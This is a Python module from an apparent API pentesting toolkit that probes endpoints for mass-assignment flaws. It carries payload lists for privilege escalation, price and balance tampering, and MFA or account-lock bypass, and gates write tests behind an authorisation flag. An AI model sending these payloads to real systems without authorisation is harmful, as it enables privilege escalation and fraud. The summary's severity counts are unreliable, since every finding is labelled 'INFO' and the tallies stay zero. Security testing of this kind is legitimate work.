#!/usr/bin/env python3
"""
Mass Assignment Tester Module - api-breaker
Tests for mass assignment vulnerabilities on API creation/update endpoints.
Author: orizon.one
"""

import argparse
import json
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone


from _common import http_request, log, same_origin_url, success, warn
# Extra fields to inject for mass assignment testing
INJECTION_FIELDS = {
    # Privilege escalation
    "role": ["admin", "administrator", "superuser", "root"],
    "isAdmin": [True],
    "is_admin": [True],
    "admin": [True],
    "is_superuser": [True],
    "user_type": ["admin"],
    "account_type": ["premium", "enterprise", "admin"],
    "permissions": [["*"], ["admin"], ["read", "write", "delete", "admin"]],
    "level": [999, 0],
    "privilege": ["admin"],
    "group": ["admin", "administrators"],
    "groups": [["admin"]],

    # Financial manipulation
    "price": [0, 0.01, -1],
    "amount": [0, 0.01, -1],
    "discount": [100, 99.99],
    "discount_percent": [100],
    "total": [0, 0.01],
    "balance": [999999],
    "credits": [999999],
    "cost": [0],

    # Status manipulation
    "verified": [True],
    "email_verified": [True],
    "is_verified": [True],
    "approved": [True],
    "is_approved": [True],
    "active": [True],
    "is_active": [True],
    "status": ["approved", "active", "verified"],
    "enabled": [True],

    # Bypass fields
    "two_factor_enabled": [False],
    "2fa_enabled": [False],
    "mfa_enabled": [False],
    "require_password_change": [False],
    "locked": [False],
    "suspended": [False],
}

# Nested object injection patterns
NESTED_INJECTIONS = [
    {"user": {"role": "admin"}},
    {"user": {"isAdmin": True}},
    {"profile": {"role": "admin"}},
    {"account": {"type": "admin", "verified": True}},
    {"settings": {"isAdmin": True}},
    {"metadata": {"role": "admin", "permissions": ["*"]}},
]


def find_reflected_field(data, field_name):
    """Find a field in nested response JSON without recursion or loop closures."""
    pending = [data]
    while pending:
        value = pending.pop()
        if isinstance(value, dict):
            if field_name in value:
                return True, value[field_name]
            pending.extend(value.values())
        elif isinstance(value, list):
            pending.extend(value)
    return False, None


def get_writable_endpoints(input_data):
    """Extract endpoints that accept POST/PUT/PATCH from input data."""
    writable = []

    # From openapi_endpoints
    for ep in input_data.get("openapi_endpoints", []):
        method = ep.get("method", "").upper()
        if method in ("POST", "PUT", "PATCH"):
            writable.append(ep)

    # From endpoints (schema_builder)
    for ep in input_data.get("endpoints", []):
        methods = ep.get("methods", [])
        for method in methods:
            if method.upper() in ("POST", "PUT", "PATCH"):
                writable.append({
                    "path": ep.get("path", ""),
                    "url": ep.get("url", ""),
                    "method": method.upper(),
                    "fields": ep.get("fields", {}),
                })

    # From discovered_apis
    for api in input_data.get("discovered_apis", []):
        for method in api.get("methods_available", api.get("methods_tested", [])):
            if method.upper() in ("POST", "PUT", "PATCH"):
                writable.append({
                    "path": api.get("path", ""),
                    "url": api.get("url", ""),
                    "method": method.upper(),
                })

    return writable


def get_baseline(url, method, headers, known_fields=None, delay=0):
    """Get a baseline response by sending a normal request."""
    payload = {}
    if known_fields:
        for field, ftype in known_fields.items():
            if ftype == "string":
                payload[field] = "test_baseline"
            elif ftype == "integer":
                payload[field] = 1
            elif ftype == "boolean":
                payload[field] = False
            elif ftype == "number":
                payload[field] = 1.0
            else:
                payload[field] = "test"
    else:
        payload = {"name": "mass_assign_test", "email": "test@example.com"}

    data = json.dumps(payload)
    status, resp_headers, body = http_request(url, method=method, headers=headers, data=data)
    if delay:
        time.sleep(delay)

    return status, body, payload


def test_mass_assignment_flat(url, method, auth_headers, baseline_payload, delay=0):
    """Test mass assignment with flat extra fields."""
    findings = []

    for field, test_values in INJECTION_FIELDS.items():
        for test_val in test_values:
            # Build payload: baseline + injected field
            payload = dict(baseline_payload)
            payload[field] = test_val

            data = json.dumps(payload)
            headers = dict(auth_headers)
            headers["Content-Type"] = "application/json"

            status, resp_headers, body = http_request(url, method=method, headers=headers, data=data)
            if delay:
                time.sleep(delay)

            if status in (200, 201):
                # Check if the field is reflected in response
                try:
                    resp_data = json.loads(body)
                except (json.JSONDecodeError, ValueError):
                    resp_data = {}

                field_reflected, reflected_value = find_reflected_field(resp_data, field)

                if field_reflected:
                    potential_impact = "CRITICAL" if field in (
                        "role", "isAdmin", "is_admin", "admin", "is_superuser",
                        "permissions", "privilege"
                    ) else "HIGH" if field in (
                        "price", "amount", "discount", "total", "balance",
                        "verified", "approved", "status"
                    ) else "MEDIUM"

                    warn(
                        f"Possible mass assignment: {field} echoed at {method} {url}; "
                        "verify a persisted state change before reporting"
                    )
                    findings.append({
                        "type": "mass_assignment_candidate",
                        "severity": "INFO",
                        "confidence": "low",
                        "validated": False,
                        "evidence": f"Field '{field}' was echoed; persisted assignment is unverified",
                        "potential_impact_if_confirmed": potential_impact,
                        "field": field,
                        "injected_value": test_val if not isinstance(test_val, list) else str(test_val),
                        "reflected_value": reflected_value if not isinstance(reflected_value, list) else str(reflected_value),
                        "method": method,
                        "url": url,
                        "status": status,
                        "response_preview": body[:300],
                    })
                    break  # Found for this field, move to next

            elif status == 422 or status == 400:
                # Field was recognized but validation failed - still interesting
                lower_body = body.lower()
                if field.lower() in lower_body and "unknown" not in lower_body and "unexpected" not in lower_body:
                    warn(f"Field '{field}' recognized but rejected at {url}")

    return findings


def test_mass_assignment_nested(url, method, auth_headers, baseline_payload, delay=0):
    """Test mass assignment with nested object injections."""
    findings = []

    for nested_payload in NESTED_INJECTIONS:
        payload = dict(baseline_payload)
        payload.update(nested_payload)

        data = json.dumps(payload)
        headers = dict(auth_headers)
        headers["Content-Type"] = "application/json"

        status, _, body = http_request(url, method=method, headers=headers, data=data)
        if delay:
            time.sleep(delay)

        if status in (200, 201):
            try:
                resp_data = json.loads(body)
            except (json.JSONDecodeError, ValueError):
                resp_data = {}

            # Check if nested values are reflected
            nested_key = list(nested_payload.keys())[0]
            nested_val = nested_payload[nested_key]

            pending = [resp_data]
            nested_reflected = False
            while pending:
                current = pending.pop()
                if isinstance(current, dict):
                    reflected = current.get(nested_key)
                    if isinstance(reflected, dict) and any(
                        key in reflected and reflected[key] == value
                        for key, value in nested_val.items()
                    ):
                        nested_reflected = True
                        break
                    pending.extend(current.values())
                elif isinstance(current, list):
                    pending.extend(current)

            if nested_reflected:
                warn(
                    f"Possible nested mass assignment: {nested_key} echoed at {method} {url}; "
                    "verify a persisted state change before reporting"
                )
                findings.append({
                    "type": "mass_assignment_candidate",
                    "severity": "INFO",
                    "confidence": "low",
                    "validated": False,
                    "evidence": f"Nested field '{nested_key}' was echoed; persisted assignment is unverified",
                    "potential_impact_if_confirmed": "HIGH",
                    "nested_key": nested_key,
                    "injected_payload": str(nested_payload),
                    "method": method,
                    "url": url,
                    "status": status,
                    "response_preview": body[:300],
                })

    return findings


def main():
    parser = argparse.ArgumentParser(description="Mass Assignment Tester - orizon.one")
    parser.add_argument("--input", "-i", help="Input JSON from schema_builder.py or api_discovery.py")
    parser.add_argument("--output", "-o", help="Output JSON file")
    parser.add_argument("--token", help="Auth token (Bearer)")
    parser.add_argument("--cookie", help="Session cookie")
    parser.add_argument("--api-base", help="Trusted API base URL for scoping imported endpoints")
    parser.add_argument("--endpoint", help="Specific endpoint path to test")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (seconds)")
    parser.add_argument(
        "--allow-mutation-write",
        action="store_true",
        help="Enable active POST/PUT/PATCH tests that create or modify target data",
    )
    args = parser.parse_args()

    if not args.input and not (args.api_base and args.endpoint):
        parser.error("Either --input or --api-base with --endpoint is required")

    extra_headers = {}
    auth_headers = {"Content-Type": "application/json"}
    if args.cookie:
        extra_headers["Cookie"] = args.cookie
        auth_headers["Cookie"] = args.cookie
    if args.token:
        auth_val = args.token if " " in args.token else f"Bearer {args.token}"
        extra_headers["Authorization"] = auth_val
        auth_headers["Authorization"] = auth_val

    base_url = args.api_base or ""
    writable_endpoints = []

    if args.input:
        log(f"Loading data from {args.input}")
        with open(args.input) as f:
            input_data = json.load(f)
        writable_endpoints = get_writable_endpoints(input_data)

    if args.endpoint:
        url = urllib.parse.urljoin(base_url, args.endpoint) if base_url else args.endpoint
        writable_endpoints.append({
            "path": args.endpoint,
            "url": url,
            "method": "POST",
            "fields": {},
        })

    log(f"Testing mass assignment for: {base_url}")
    log(f"Writable endpoints: {len(writable_endpoints)}")

    if writable_endpoints and not args.api_base:
        parser.error("Writable imported endpoints require an explicit trusted --api-base")
    if writable_endpoints and not same_origin_url(base_url, base_url):
        parser.error("Writable endpoints require a credential-free absolute HTTP(S) API base")
    if writable_endpoints and not args.allow_mutation_write:
        parser.error(
            "Mass-assignment probes send write requests; rerun with --allow-mutation-write "
            "only when writes are authorized and safe"
        )

    all_findings = []
    tested_count = 0

    for ep in writable_endpoints:
        candidate_url = ep.get("url", "")
        path = ep.get("path", "")
        method = ep.get("method", "POST").upper()
        known_fields = ep.get("fields", {})

        url = same_origin_url(base_url, candidate_url or path)
        if not url:
            warn(f"Skipping endpoint outside the API base origin: {candidate_url or path}")
            continue

        log(f"Testing: {method} {path or url}")

        # Get baseline
        baseline_status, baseline_body, baseline_payload = get_baseline(
            url, method, auth_headers, known_fields, args.delay
        )

        if baseline_status in (0, 404, 405):
            warn(f"  Baseline failed (status={baseline_status}), skipping")
            continue

        # Test flat mass assignment
        flat_findings = test_mass_assignment_flat(url, method, auth_headers, baseline_payload, args.delay)
        all_findings.extend(flat_findings)

        # Test nested mass assignment
        nested_findings = test_mass_assignment_nested(url, method, auth_headers, baseline_payload, args.delay)
        all_findings.extend(nested_findings)

        tested_count += 1

    # Categorize
    critical = [f for f in all_findings if f.get("severity") == "critical"]
    high = [f for f in all_findings if f.get("severity") == "high"]
    medium = [f for f in all_findings if f.get("severity") == "medium"]

    output = {
        "meta": {
            "base_url": base_url,
            "timestamp": datetime.now(timezone.utc).isoformat().replace('+00:00', 'Z'),
            "type": "mass_assignment_testing",
            "tool": "api-breaker by orizon.one",
        },
        "stats": {
            "total_findings": len(all_findings),
            "endpoints_tested": tested_count,
            "critical": len(critical),
            "high": len(high),
            "medium": len(medium),
            "fields_tested": len(INJECTION_FIELDS),
            "nested_patterns_tested": len(NESTED_INJECTIONS),
        },
        "findings": all_findings,
    }

    domain = urllib.parse.urlparse(base_url).hostname or "unknown" if base_url else "unknown"
    output_path = args.output or f"mass_assignment_{domain.replace('.', '_')}.json"
    with open(output_path, "w") as f:
        json.dump(output, f, indent=2)
    success(f"Results saved to: {output_path}")

    print(f"\n{'='*60}")
    print(f"  MASS ASSIGNMENT TEST SUMMARY - {base_url}")
    print(f"{'='*60}")
    print(f"  Endpoints tested    : {tested_count}")
    print(f"  Fields tested       : {len(INJECTION_FIELDS)}")
    print(f"  Nested patterns     : {len(NESTED_INJECTIONS)}")
    print(f"  Total findings      : {len(all_findings)}")
    print(f"  Critical            : {len(critical)}")
    print(f"  High                : {len(high)}")
    print(f"  Medium              : {len(medium)}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
